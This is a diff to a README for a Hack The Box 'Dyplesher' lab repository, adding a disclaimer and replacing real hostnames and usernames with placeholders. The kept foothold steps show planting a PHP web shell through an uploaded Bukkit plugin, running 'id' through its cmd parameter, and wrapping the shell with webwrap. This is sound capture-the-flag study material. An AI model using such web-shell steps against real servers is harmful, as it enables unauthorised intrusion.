@@ -1,4 +1,8 @@
 # HTB-Dyplesher :alien:
+# Warning message
+**This is _not_ a complete write-up for the Dyplesher (10.10.10.1901), just a small nudge for the foothold part.**
+
+**I developed this Bash script and use these files because I didn't want to depend/use on a heavy Integrated Development Environment (IDE).**
 # Description
 Ceate a Bukkit plugin without using an IDE. This is a simple build script written in Bash to create your Java archive data (JAR) from a Linux platform.
 
@@ -108,7 +112,7 @@ root@HTB:~/HTB-Dyplesher/payload# tree
 9 directories, 7 files
 ```
 # Obtaining a "pseudo" shell
-Put in your hosts file: dyplesher.htb + test.dyplesher.htb = 10.10.10.190
+Put in your hosts file: dyplesher.htb + [subdomain].dyplesher.htb = 10.10.10.190
 
 Once you have you JAR file, add the plugin and reload it on the web interface:
 
@@ -117,9 +121,9 @@ http://dyplesher.htb/home/reload
 
 Then, check you can launch a PHP command:
 
-http://test.dyplesher.htb/batman.php?cmd=id
+http://[subdomain].dyplesher.htb/batman.php?cmd=id
 
-uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
+uid=1001([user]) gid=1001([user]) groups=1001([user]),122([group])
 
 Finally, install this great tool:
 
@@ -128,9 +132,9 @@ https://github.com/mxrch/webwrap
 With your web shell you will be able to simulate a terminal:
 
 ```
-root@HTB:~/HTB/Dyplesher/webwrap# ./webwrap http://test.dyplesher.htb/batman.php?cmd=WRAP
+root@HTB:~/HTB/Dyplesher/webwrap# ./webwrap http://[subdomain].dyplesher.htb/batman.php?cmd=WRAP
 
-MinatoTW@dyplesher:/var/www/test$ ls
+[user]@dyplesher:/var/www/[subdomain]$ ls
 README.md
 batman.php
 index.php
